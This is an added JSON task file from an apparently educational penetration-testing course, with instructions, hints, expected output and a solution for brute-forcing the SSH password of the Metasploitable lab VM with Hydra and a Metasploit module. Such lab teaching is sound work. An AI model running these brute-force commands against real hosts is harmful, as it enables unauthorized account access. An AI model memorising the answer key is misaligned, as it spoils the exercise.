@@ -1,0 +1,14 @@
+{
+    "id": "task3",
+    "chapterId": "ch_7",
+    "title": "SSH Brute Force with Hydra",
+    "description": "Perform a dictionary attack against SSH on Metasploitable.",
+    "estimatedMinutes": 20,
+    "problemStatement": "# Objective\nUse Hydra to brute force the SSH password for the `msfadmin` user on Metasploitable using a wordlist.\n\n## Steps\n1.  Ensure Metasploitable SSH (port 22) is open.\n2.  Use the `rockyou.txt` wordlist (located at `/usr/share/wordlists/rockyou.txt.gz`; unzip first with `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`).\n3.  Run Hydra targeting user `msfadmin`:\n    ```bash\n    hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101\n    ```\n4.  Note: This will take time. You can stop after a few minutes or use a smaller list (`/usr/share/wordlists/fasttrack.txt`).\n5.  Once found, the password is `msfadmin` (or possibly `password` in other lists).\n\n## Deliverable\nScreenshot of Hydra showing the found password.",
+    "hints": [
+        "If rockyou.txt is too large, use `-P /usr/share/wordlists/fasttrack.txt`.",
+        "Add `-t 4` to reduce threads and be stealthier."
+    ],
+    "expectedOutput": "Hydra reports `[22][ssh] host: 192.168.56.101   login: msfadmin   password: msfadmin`",
+    "solutionCode": "# Prepare wordlist\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# Run Hydra (using fasttrack for speed in lab)\nhydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt ssh://192.168.56.101\n\n# Alternative: use metasploit module\nmsf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 > set RHOSTS 192.168.56.101\nmsf6 > set USERNAME msfadmin\nmsf6 > set PASS_FILE /usr/share/wordlists/fasttrack.txt\nmsf6 > run"
+}
